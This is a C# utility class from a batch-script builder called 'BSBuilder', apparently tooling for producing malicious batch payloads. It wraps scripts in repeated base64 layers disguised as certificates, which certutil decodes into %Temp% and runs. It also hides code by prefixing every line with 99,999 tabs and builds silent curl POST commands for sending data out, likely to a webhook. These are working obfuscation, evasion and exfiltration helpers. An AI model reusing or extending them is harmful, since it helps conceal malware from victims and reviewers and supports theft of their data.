using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace BSBuilder
{
    class Utils
    {
        public string Base64Encode(string plainText)
        {
            try
            {
                var plainTextBytes = Encoding.UTF8.GetBytes(plainText);
                return Convert.ToBase64String(plainTextBytes);
            }
            catch
            {
                MessageBox.Show("You most likely added too many BASE64/CERT layers and ran out of memory.\n\nTry again with less than 30 layers.", "Memory error");
                return "";
            }
        }

        public string removeGoto(string batch, string data)
        {
            data = "goto " + data;

            batch = batch.Replace(data, string.Empty);

            data = data.Substring(5);
            data = ":" + data.PadLeft(data.Length, '0');

            return batch.Replace(data, string.Empty);
        }

        public string removeFunction(string batch, string data)
        {
            string first = "goto " + data,
                   last = ":" + data.PadLeft(data.Length, '0');

            return Regex.Replace(batch, first + "\n((.+\n)+)" + last, string.Empty);
        }

        public string editVar(string batch, string original, string variable, string data)
        {
            if (data.Length != 0)
            {
                return batch.Replace(original, $"set \"{variable}={data}\"");
            }
            else 
            {
                return batch;
            }
        }

        public string constructCurlPost(string data)
        {
            return "curl --silent --output /dev/null -i -H \"Accept: application/json\" -H \"Content-Type:application/json\" -X POST --data \"{\\\"content\\\": \\\"" + data + "\\\"}\"";
        }

        public string editCurl(string batch, string original, string data)
        {
            return batch.Replace(original, constructCurlPost(data));
        }

        public string addCert(string batch, int layers)
        {
            string finalStr = batch;

            for (int i = 0; i < layers; i++)
            {
                string encodedBatch = Base64Encode(finalStr);
                string cert = string.Empty;

                if (encodedBatch.Length > 0)
                {
                    try
                    {
                        cert = string.Format("-----BEGIN CERTIFICATE----- {0} -----END CERTIFICATE-----", encodedBatch);
                    }
                    catch
                    {
                        MessageBox.Show("Probably too many CERT layers and you ran out of memory.", "Error");
                    }
                }
                else
                {
                    break;
                }

                finalStr = "@echo off & CERTUTIL -f -decode \"%~f0\" \"%Temp%\\0.bat\" >nul 2>&1 & call \"%Temp%\\0.bat\" & Exit\n" + cert;
            }

            return finalStr;
        }

        public string optimize(string batch) 
        {
            batch = Regex.Replace(batch, @"^::.*", string.Empty, RegexOptions.Multiline);
            batch = Regex.Replace(batch, @"^\s*$\n|\r", string.Empty, RegexOptions.Multiline);
            batch = Regex.Replace(batch, @"\t", string.Empty, RegexOptions.Multiline);
            batch = Regex.Replace(batch, @"[\n\r]+$", string.Empty, RegexOptions.Multiline);

            return batch;
        }

        public string pushToSide(string batch)
        {
            string pushedStr = String.Concat(Enumerable.Repeat("\t", 99999));

            return Regex.Replace(batch, @"^", pushedStr, RegexOptions.Multiline);
        }
    }
}